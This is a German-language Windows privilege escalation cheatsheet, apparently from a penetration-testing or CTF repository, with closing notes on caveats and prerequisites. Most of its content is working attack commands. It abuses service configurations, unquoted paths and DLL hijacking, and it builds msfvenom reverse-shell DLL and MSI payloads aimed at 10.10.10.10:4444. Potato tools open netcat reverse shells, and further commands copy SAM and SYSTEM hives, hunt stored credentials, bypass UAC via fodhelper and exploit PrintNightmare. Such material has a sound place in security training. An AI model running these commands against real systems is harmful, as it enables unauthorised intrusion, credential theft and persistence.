# 🪟 Windows-Rechteausweitung – vollständiges Cheatsheet

<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██╗    ██╗██╗███╗   ██╗██████╗  ██████╗ ██╗    ██╗███████╗
  ██║    ██║██║████╗  ██║██╔══██╗██╔═══██╗██║    ██║██╔════╝
  ██║ █╗ ██║██║██╔██╗ ██║██║  ██║██║   ██║██║ █╗ ██║███████╗
  ██║███╗██║██║██║╚██╗██║██║  ██║██║   ██║██║███╗██║╚════██║
  ╚███╔███╔╝██║██║ ╚████║██████╔╝╚██████╔╝╚███╔███╔╝███████║
   ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝╚═════╝  ╚═════╝  ╚══╝╚══╝ ╚══════╝
  ██████╗ ██████╗ ██╗██╗   ██╗███████╗███████╗ ██████╗
  ██╔══██╗██╔══██╗██║██║   ██║██╔════╝██╔════╝██╔════╝
  ██████╔╝██████╔╝██║██║   ██║█████╗  ███████╗██║     
  ██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝██╔══╝  ╚════██║██║     
  ██║     ██║  ██║██║ ╚████╔╝ ███████╗███████║╚██████╗
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚══════╝ ╚═════╝
```

<p align="center">
  <img src="https://img.shields.io/badge/Windows-PrivEsc-blue?style=for-the-badge" alt="Windows PrivEsc">
  <img src="https://img.shields.io/badge/Post-Exploitation-orange?style=for-the-badge" alt="Post Exploitation">
  <img src="https://img.shields.io/badge/SYSTEM-Access-red?style=for-the-badge" alt="SYSTEM">
  <img src="https://img.shields.io/badge/CTF-Ready-green?style=for-the-badge" alt="CTF">
</p>

<p align="center">
  <b>🔓 Vollständiger Leitfaden zur Rechteausweitung unter Windows</b>
</p>

---

Privilege Escalation (Rechteausweitung) bedeutet, aus einem vorhandenen Zugriff höhere Berechtigungen zu erlangen. SYSTEM bezeichnet ein besonders privilegiertes lokales Windows-Konto.

## 📋 Inhaltsverzeichnis

- [Bestandsaufnahme](#-bestandsaufnahme)
- [Dienste ausnutzen](#-dienste-ausnutzen)
- [Dienstpfade ohne Anführungszeichen](#-dienstpfade-ohne-anführungszeichen)
- [DLL Hijacking](#-dll-hijacking)
- [AlwaysInstallElevated](#-alwaysinstallelevated)
- [Gespeicherte Zugangsdaten](#-gespeicherte-zugangsdaten)
- [Token-Manipulation](#-token-manipulation)
- [Potato-Angriffe](#-potato-angriffe)
- [Registry-Einträge ausnutzen](#-registry-einträge-ausnutzen)
- [Geplante Aufgaben](#-geplante-aufgaben)
- [UAC umgehen](#-uac-umgehen)
- [Kernel-Exploits](#-kernel-exploits)
- [Schnellübersicht](#-schnellübersicht)

---

## 🔍 Bestandsaufnahme

### Systeminformationen

```cmd
# Systeminformationen
systeminfo
hostname

# Betriebssystemversion
ver
wmic os get caption,version,buildnumber

# Architektur
echo %PROCESSOR_ARCHITECTURE%

# Updates/Hotfixes
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

### Benutzerinformationen

```cmd
# Aktueller Benutzer
whoami
whoami /all
whoami /priv
whoami /groups

# Alle Benutzer
net user
net localgroup administrators

# Benutzerdetails
net user username

# Aktuelle Privilegien
whoami /priv
```

### Netzwerkinformationen

```cmd
# IP-Konfiguration
ipconfig /all

# Routen
route print

# Offene Ports
netstat -ano
netstat -an | findstr LISTENING

# ARP-Tabelle
arp -a

# DNS-Cache
ipconfig /displaydns
```

### Prozesse und Dienste

```cmd
# Laufende Prozesse
tasklist
tasklist /svc
wmic process list full

# Dienste
sc query
net start
wmic service list brief

# Treiber
driverquery
```

### Bestandsaufnahme mit PowerShell

```powershell
# Systeminformationen
Get-ComputerInfo

# Benutzer
Get-LocalUser
Get-LocalGroupMember Administrators

# Dienste
Get-Service

# Prozesse
Get-Process

# Installierte Software
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, Publisher, InstallDate
```

---

<a name="-dienste-ausnutzen"></a>

## ⚙️ Dienste ausnutzen

### Anfällige Dienste finden

```cmd
# Dienste auflisten
sc query state= all

# Dienstberechtigungen
accesschk.exe -uwcqv "Everyone" *
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "Users" *

# Bestimmten Dienst prüfen
sc qc servicename
```

### Unzureichend geschützte Dienstberechtigungen

```cmd
# Wenn die Dienstkonfiguration geändert werden kann:
sc config servicename binpath= "C:\Users\Public\shell.exe"
sc config servicename binpath= "net localgroup administrators user /add"
sc stop servicename
sc start servicename
```

### Unzureichend geschützte Dienstprogramme

```cmd
# Berechtigungen der Programmdatei prüfen
icacls "C:\Program Files\Service\binary.exe"

# Falls beschreibbar, durch eine manipulierte Programmdatei ersetzen
copy shell.exe "C:\Program Files\Service\binary.exe"
sc stop servicename
sc start servicename
```

### Dienste mit PowerShell prüfen

```powershell
# Dienstinformationen abrufen
Get-WmiObject win32_service | Select-Object Name, StartName, PathName

# Veränderbare Dienste finden
Get-ModifiableService
```

---

## 📂 Dienstpfade ohne Anführungszeichen

### Pfade ohne Anführungszeichen finden

```cmd
# Dienstpfade ohne Anführungszeichen finden
wmic service get name,pathname,displayname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# PowerShell
Get-WmiObject win32_service | Select-Object Name,PathName | Where-Object {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'}
```

### Pfad ohne Anführungszeichen ausnutzen

```
# Wenn der Pfad lautet: C:\Program Files\Vulnerable Service\service.exe
# Windows prüft folgende Pfade:
# 1. C:\Program.exe
# 2. C:\Program Files\Vulnerable.exe
# 3. C:\Program Files\Vulnerable Service\service.exe

# Manipulierte EXE-Datei ablegen:
copy shell.exe "C:\Program Files\Vulnerable.exe"

# Dienst neu starten
sc stop "Vulnerable Service"
sc start "Vulnerable Service"
```

---

## 📚 DLL Hijacking

### Fehlende DLLs finden

```cmd
# Mit Process Monitor nach fehlenden DLLs suchen
# Filter: Result = NAME NOT FOUND, Path endet mit .dll

# Häufig geprüfte Verzeichnisse:
# 1. Anwendungsverzeichnis
# 2. C:\Windows\System32
# 3. C:\Windows
# 4. Aktuelles Verzeichnis
# 5. Verzeichnisse in PATH
```

### Manipulierte DLL erstellen

```c
// msfvenom-Payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll -o evil.dll

// Alternativ eine eigene DLL kompilieren:
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /c net localgroup administrators user /add");
    }
    return TRUE;
}
```

### Ausnutzung

```cmd
# DLL in ein beschreibbares Verzeichnis im Suchpfad kopieren
copy evil.dll "C:\Program Files\App\missing.dll"

# Laden der DLL durch die Anwendung auslösen
# Dienst oder Anwendung neu starten
```

---

## 📦 AlwaysInstallElevated

### Auf die Schwachstelle prüfen

```cmd
# Beide Werte müssen auf 1 gesetzt sein
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Ausnutzung

```bash
# Manipuliertes MSI-Paket erzeugen
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o evil.msi

# Übertragen und ausführen
msiexec /quiet /qn /i evil.msi
```

---

## 🔑 Gespeicherte Zugangsdaten

### Anmeldeinformationsverwaltung

```cmd
# Gespeicherte Zugangsdaten auflisten
cmdkey /list

# Gespeicherte Zugangsdaten verwenden
runas /savecred /user:Administrator cmd.exe
```

### SAM und SYSTEM

```cmd
# SAM-Dateien kopieren (SYSTEM erforderlich)
copy C:\Windows\System32\config\SAM C:\Users\Public\SAM
copy C:\Windows\System32\config\SYSTEM C:\Users\Public\SYSTEM

# Aus Schattenkopien
vssadmin list shadows
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM .
```

### Zugangsdaten in der Registry

```cmd
# Passwörter für automatische Anmeldung
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword

# VNC-Passwörter
reg query "HKCU\Software\ORL\WinVNC3\Password"

# PuTTY-Sitzungen
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
```

### Dateien mit Passwörtern

```cmd
# Nach Passwörtern suchen
findstr /si password *.txt *.xml *.ini *.config
findstr /spin "password" *.*

# Dateien für unbeaufsichtigte Installation
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\System32\sysprep.inf
C:\Windows\System32\sysprep\sysprep.xml

# PowerShell-Verlauf
type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# IIS-Konfiguration
type C:\inetpub\wwwroot\web.config
```

### WLAN-Passwörter

```cmd
# Profile auflisten
netsh wlan show profiles

# Passwort abrufen
netsh wlan show profile name="SSID" key=clear
```

---

## 🎭 Token-Manipulation

### Privilegien prüfen

```cmd
whoami /priv

# Kritische Privilegien:
# SeImpersonatePrivilege
# SeAssignPrimaryTokenPrivilege
# SeTcbPrivilege
# SeBackupPrivilege
# SeRestorePrivilege
# SeCreateTokenPrivilege
# SeLoadDriverPrivilege
# SeTakeOwnershipPrivilege
# SeDebugPrivilege
```

### SeImpersonatePrivilege

```cmd
# Wenn SeImpersonatePrivilege aktiviert ist:
# Potato-Angriffe verwenden (JuicyPotato, PrintSpoofer usw.)

# PrintSpoofer
PrintSpoofer.exe -i -c "cmd"
PrintSpoofer.exe -c "C:\Users\Public\nc.exe 10.10.10.10 4444 -e cmd"

# GodPotato
GodPotato.exe -cmd "cmd /c whoami"
```

### SeBackupPrivilege

```cmd
# Kann jede Datei lesen
# SAM und SYSTEM kopieren
robocopy /b C:\Windows\System32\config C:\Users\Public SAM SYSTEM
```

### SeRestorePrivilege

```cmd
# Kann an jeden Speicherort schreiben
# Systemdateien ersetzen
```

---

## 🥔 Potato-Angriffe

### JuicyPotato (Windows Server 2016/2019)

```cmd
# Erfordert SeImpersonatePrivilege oder SeAssignPrimaryToken
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net localgroup administrators user /add" -t *
```

### PrintSpoofer (Windows 10/Server 2016+)

```cmd
# Erfordert SeImpersonatePrivilege
PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -c "nc.exe 10.10.10.10 4444 -e cmd"
```

### RoguePotato

```cmd
RoguePotato.exe -r 10.10.10.10 -e "cmd /c whoami > C:\Users\Public\out.txt" -l 9999
```

### GodPotato (Windows 10/11/Server 2019-2022)

```cmd
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "nc.exe -t -e C:\Windows\System32\cmd.exe 10.10.10.10 4444"
```

---

## 📝 Registry-Einträge ausnutzen

### Autostarteinträge

```cmd
# Autostartpfade prüfen
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# Falls beschreibbar, manipulierten Eintrag hinzufügen
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Evil /t REG_SZ /d "C:\Users\Public\shell.exe"
```

### Registry-Schlüssel von Diensten

```cmd
# Berechtigungen der Dienstschlüssel in der Registry prüfen
accesschk.exe -kvuqws "Everyone" HKLM\System\CurrentControlSet\Services

# ImagePath des Dienstes ändern
reg add "HKLM\SYSTEM\CurrentControlSet\Services\vulnerable" /v ImagePath /t REG_EXPAND_SZ /d "C:\Users\Public\shell.exe" /f
```

---

## ⏰ Geplante Aufgaben

### Geplante Aufgaben auflisten

```cmd
schtasks /query /fo LIST /v
schtasks /query /fo TABLE

# PowerShell
Get-ScheduledTask | Select-Object TaskName, TaskPath, State
```

### Beschreibbare Aufgabenskripte finden

```cmd
# Wenn die Aufgabe ein veränderbares Skript ausführt:
icacls "C:\Scripts\backup.bat"

# Manipulierten Befehl hinzufügen
echo net localgroup administrators user /add >> C:\Scripts\backup.bat
```

### Manipulierte Aufgabe erstellen

```cmd
# Wenn die Berechtigung zum Erstellen von Aufgaben vorliegt
schtasks /create /tn "Evil" /tr "C:\Users\Public\shell.exe" /sc onlogon /ru SYSTEM
```

---

<a name="-uac-umgehen"></a>

## 🛡️ UAC umgehen

### UAC-Stufe prüfen

```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
```

### Umgehung über Fodhelper

```cmd
# Funktioniert unter Windows 10
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
fodhelper.exe

# Bereinigen
reg delete HKCU\Software\Classes\ms-settings /f
```

### Umgehung über EventViewer

```cmd
reg add HKCU\Software\Classes\mscfile\shell\open\command /d "cmd.exe" /f
eventvwr.exe
```

---

## 💣 Kernel-Exploits

### Systeminformationen prüfen

```cmd
systeminfo
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

### Verbreitete Exploits

| CVE | Windows-Version | Name |
|-----|-----------------|------|
| MS08-067 | XP/2003 | NetAPI |
| MS16-032 | 7/8/10/2012 | Secondary Logon |
| MS17-010 | All | **EternalBlue** |
| CVE-2020-0796 | 10/Server 2019 | **SMBGhost** |
| CVE-2021-1732 | 10/Server | Win32k |
| CVE-2021-34527 | All | **PrintNightmare** |

### PrintNightmare (CVE-2021-34527)

```cmd
# Auf Anfälligkeit prüfen
Get-Service Spooler

# Ausnutzung (PowerShell)
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "hacker" -NewPassword "password123!" -DriverName "Xerox"
```

---

## 📊 Schnellübersicht

### Bestandsaufnahme mit Einzeilern

```cmd
# Kurzübersicht
whoami /all & systeminfo & net user

# Privilegien prüfen
whoami /priv

# Dienste
wmic service get name,pathname | findstr /i /v "c:\windows"

# Geplante Aufgaben
schtasks /query /fo LIST /v | findstr /i "taskname\|run"
```

### Automatisierte Werkzeuge

| Werkzeug | Beschreibung |
|------|-------------|
| **WinPEAS** | Umfassende Bestandsaufnahme |
| **PowerUp** | Rechteausweitung mit PowerShell |
| **Seatbelt** | Sicherheitsprüfungen |
| **SharpUp** | Prüfungen auf Rechteausweitung mit C# |

### Checkliste für erste Ansatzpunkte

- [ ] `whoami /priv` – SeImpersonate prüfen
- [ ] Dienstpfade ohne Anführungszeichen
- [ ] Beschreibbare Dienstprogramme
- [ ] AlwaysInstallElevated
- [ ] Gespeicherte Zugangsdaten (cmdkey /list)
- [ ] Passwörter für automatische Anmeldung in der Registry
- [ ] Unzureichend geschützte Dienstberechtigungen
- [ ] Skripte geplanter Aufgaben
- [ ] Kernel-Version – PrintNightmare?

---

## 📚 Ressourcen

- [LOLBAS](https://lolbas-project.github.io/)
- [HackTricks: Windows-Rechteausweitung](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

### Verwandte Cheatsheets
- WinPEAS – die im Original verlinkte lokale Seite ist in dieser Kopie nicht vorhanden.
- [Linux-Rechteausweitung](../../Linux-PrivEsc/translations/README.de.md)

---

## 📝 Ergänzende Hinweise zu den Originalbeispielen

- **Versionen und Shell-Kontext:** Die Vorlage mischt cmd-, PowerShell- und Shell-Fragmente. Die mit # markierten Erklärungen sind keine cmd-Kommentare; auch der msfvenom-Aufruf im C-Block ist kein C-Code. WMIC wurde aus aktuellen Windows-11-Versionen entfernt, WMI selbst bleibt erhalten. Get-WmiObject gehört zu Windows PowerShell und ist in PowerShell 7 nicht verfügbar; Get-ModifiableService stammt aus PowerUp und ist kein eingebautes Cmdlet. Die ursprünglichen Befehle bleiben unverändert. [Microsoft: WMIC-Entfernung](https://support.microsoft.com/en-gb/servicing/os/windows/docs/2025/09/windows-management-instrumentation-command-line-wmic-removal-from-windows), [Microsoft: PowerShell-Unterschiede](https://learn.microsoft.com/en-us/powershell/scripting/whats-new/differences-from-windows-powershell), [PowerUp: Quellcode](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1).
- **Dienste, Aufgaben und Pfade:** Ein beschreibbarer Pfad allein garantiert keine Rechteausweitung. Dienstkonto, konkrete Änderungs-/Startberechtigungen und ein erreichbarer Ausführungszeitpunkt sind entscheidend. Pfade ohne Anführungszeichen benötigen unter anderem Leerzeichen und einen beschreibbaren, früher geprüften Kandidaten. Ein Autostarteintrag läuft nicht automatisch als SYSTEM; eine Aufgabe mit diesem Konto verlangt passende Berechtigungen. Die englischen Gruppennamen der Beispiele können sprachabhängig sein. [Microsoft: Dienstrechte](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights), [Microsoft: Prozessstart und mehrdeutige Pfade](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw).
- **DLLs und Privilegien:** Die DLL-Suchreihenfolge ist verkürzt und hängt von Ladeverfahren, Safe DLL Search Mode und Anwendungskonfiguration ab. NAME NOT FOUND allein belegt keine ausnutzbare DLL-Lücke. Der DLL-Block ist keine vollständige Bauanleitung; DllMain läuft unter dem Loader-Lock und sollte möglichst wenig Arbeit ausführen. Backup-/Restore-Privilegien müssen im passenden API-Kontext genutzt werden; die pauschalen Lese-/Schreibbeschreibungen ersetzen keine Zugriffsprüfung. [Microsoft: DLL-Suchreihenfolge](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order), [Microsoft: DllMain-Einschränkungen](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-best-practices), [Microsoft: Privilegien](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants).
- **Gespeicherte Daten und Dateisperren:** Eine Auflistung gespeicherter Zugangsdaten garantiert keine passenden, mit runas nutzbaren Administratorzugangsdaten. Auch SYSTEM- oder Backup-Rechte heben Dateisperren aktiver Registry-Hives nicht pauschal auf; die direkten SAM-/SYSTEM-Kopierbeispiele sind daher keine Erfolgsgarantie. Für Systemzustandssicherungen mit Hives verweist Microsoft auf VSS. [Microsoft: cmdkey](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey), [Microsoft: Registry-Sicherung und VSS](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsavekeya).
- **Potato und UAC:** Die Versionsüberschriften sind historische Vereinfachungen. Im JuicyPotato-Projekt wird bereits für Windows 10 Build 1809 eine blockierte ursprüngliche Technik beschrieben; die Überschrift mit Server 2019 ist daher keine Kompatibilitätszusage. Andere Varianten haben eigene Voraussetzungen. UAC-Umgehungen sind build-, richtlinien- und kontobezogen und geben einem beliebigen Standardbenutzer nicht automatisch ein Administratortoken. [JuicyPotato: ursprüngliche Build-Grenze](https://github.com/ohpe/juicy-potato/issues/4), [Microsoft: UAC und Token](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/how-it-works).
- **Exploit-Tabelle und PrintNightmare:** Die Tabelle vermischt Bulletin-IDs, CVEs sowie lokale und entfernte Angriffe; sie ist keine Liste ausschließlich von Kernel-Lücken. All ist keine Aussage über vollständig aktualisierte Systeme. MS17-010 betrifft SMBv1; SMBGhost betrifft bestimmte 1903-/1909-Versionen statt pauschal Server 2019. PrintNightmare betrifft den Print Spooler; ein laufender Spooler allein bestätigt keine Anfälligkeit. Entscheidend sind Build, Updates und Richtlinien. Der Skriptdateiname mit CVE-2021-1675 belegt keine Gleichheit mit CVE-2021-34527. [Microsoft: MS17-010](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010), [Microsoft: SMBGhost](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-0796), [Microsoft: PrintNightmare-Einordnung](https://www.microsoft.com/en-us/msrc/blog/2021/07/clarified-guidance-for-cve-2021-34527-windows-print-spooler-vulnerability).

---

<p align="center">
  <b>🪟 SYSTEM-Rechte erlangen!</b><br>
  <i>Windows-Rechteausweitung verstehen und prüfen</i>
</p>
